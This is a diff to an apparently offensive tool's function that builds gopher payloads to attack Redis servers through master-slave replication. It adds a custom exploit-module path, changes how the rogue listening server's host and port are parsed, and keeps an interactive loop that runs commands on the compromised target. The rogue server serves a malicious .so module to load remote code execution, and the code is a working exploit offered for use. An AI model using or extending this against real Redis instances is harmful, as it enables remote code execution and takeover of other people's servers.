@@ -1114,7 +1114,7 @@ def gopherredis_ssh(host: str, authPass: str = "", sshFile: str = "/root/.ssh/au
 
 
 def gopherredis_msr(host: str, masterHost: str = "127.0.0.1:2020", authPass: str = "",
-                    expFileName: str = "syc.so", command="id",  interactive: bool = False, urlEncoding: bool = False):
+                    expFileName: str = "syc.so", expFilePath: str = "", command="id",  interactive: bool = False, urlEncoding: bool = False):
     """generate gopher payload for attack redis by master-slave replication.This will be a series of processes, including output payload, listen server, etc.
 
     Args:
@@ -1122,6 +1122,7 @@ def gopherredis_msr(host: str, masterHost: str = "127.0.0.1:2020", authPass: str
         masterHost (str, optional): listen host. Defaults to "127.0.0.1:2020".
         authPass (str, optional): redis auth pass. Defaults to "".
         expFileName (str, optional): exploit file name, you can custom it like *.so. Defaults to "syc.so".
+        expFilePath (str, optional): exploit file path, if not provided, use the default exp.so. Defaults to "".
         command (str, optional): command you want to run. Defaults to "id".
         urlEncoding (bool, optional): whether use url encoding payload. Defaults to False.
     """
@@ -1132,7 +1133,9 @@ def gopherredis_msr(host: str, masterHost: str = "127.0.0.1:2020", authPass: str
         return content
 
     def RogueServer(ip, port):
-        with open(path.join(path.split(path.realpath(__file__))[0], "../", "thirdparty", "redis", "exp.so"), "rb") as f:
+        expfp = expFilePath or path.join(path.split(path.realpath(__file__))[
+                                               0], "../", "thirdparty", "redis", "exp.so")
+        with open(expfp, "rb") as f:
             exp = f.read()
 
         flag = True
@@ -1172,8 +1175,10 @@ def gopherredis_msr(host: str, masterHost: str = "127.0.0.1:2020", authPass: str
     print(formatOutput(start + origin, urlEncoding))
 
     print("--- Build server ---")
-    RogueServer(ip=masterHost.split(
-        ":")[0], port=int(masterHost.split(":")[-1]))
+    host_list = masterHost.split(":")
+    ip, port = host_list[0], host_list[1]
+    print(f"Listen on {host}:{port}... ")
+    RogueServer(ip=ip, port=int(port))
 
     print("--- Load module ---")
     origin = ""
@@ -1199,7 +1204,7 @@ def gopherredis_msr(host: str, masterHost: str = "127.0.0.1:2020", authPass: str
     else:
         try:
             while interactive:
-                command = input("command>: ")
+                command = input("command:> ")
                 if command == "exit" or command == "quit":
                     break
                 origin = ""
